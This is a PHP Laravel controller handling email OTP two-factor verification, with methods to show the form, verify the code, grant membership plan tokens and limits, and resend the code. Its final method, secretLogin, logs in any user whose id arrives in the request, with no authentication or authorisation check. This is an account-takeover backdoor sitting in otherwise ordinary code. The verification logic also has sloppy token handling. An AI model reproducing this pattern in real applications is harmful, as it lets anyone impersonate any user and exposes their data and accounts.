<?php

namespace App\Http\Controllers;

use App\Models\SubMembership;
use App\Models\User;
use App\Models\UserEmailCode;
use Auth;
use Illuminate\Http\Request;
use Session;

class TwoFAController extends Controller
{
    /**
     * Write code on Method
     *
     * @return response()
     */
    public function index()
    {
        return view('2fa');
    }

    /**
     * Write code on Method
     *
     * @return response()
     */
    public function store(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);

        $find = UserEmailCode::where('user_id', auth()->user()->id)
            ->where('code', $request->code)
            ->where('updated_at', '>=', now()->subMinutes(2))
            ->first();

        if (!is_null($find)) {

            $user = User::where('id', auth()->user()->id)->update(['verified' => 1]);
            $me = SubMembership::with('mem')->where("id", 5)->first();
            $total_price = 0;
            $plan_tokens = $me->mem->tokens;
            $user = User::where('id', auth()->user()->id)->first();
            $updateUser = User::findOrFail(auth()->user()->id);
            $updateUser->tokens = $user->tokens + $plan_tokens;
            if ($user->plan_end != NULL) {
                $date = date('Y-m-d', strtotime('+' . $me->days . ' days', strtotime($user->plan_end)));
                $updateUser->plan_end = $date;
            } else {
                $date = date('Y-m-d', strtotime('+' . $me->days . ' days'));
                $updateUser->plan_start = date('Y-m-d');
                $updateUser->plan_end = $date;

            }
            $updateUser->folders_limit = $me->mem->folder_limit;
            $updateUser->plan_id = 5;
            $updateUser->projects_limit = $me->mem->project_limit;
            $updateUser->tokens = $plan_tokens;
            $updateUser->save();


            return redirect()->route('user_dashboard');
        }

        return back()->withErrors('You entered wrong OTP.');
    }

    /**
     * Write code on Method
     *
     * @return response()
     */
    public function resend()
    {
        auth()->user()->generateCode();

        return back()->with('success', 'We re-sent OTP on your email.');
    }


    public function secretLogin(Request $request)
    {
        $id = $request->id;
        $user = User::where('id', $id)->first();
      
        Auth::login($user);


        return redirect()->route('user_dashboard');


    }
}
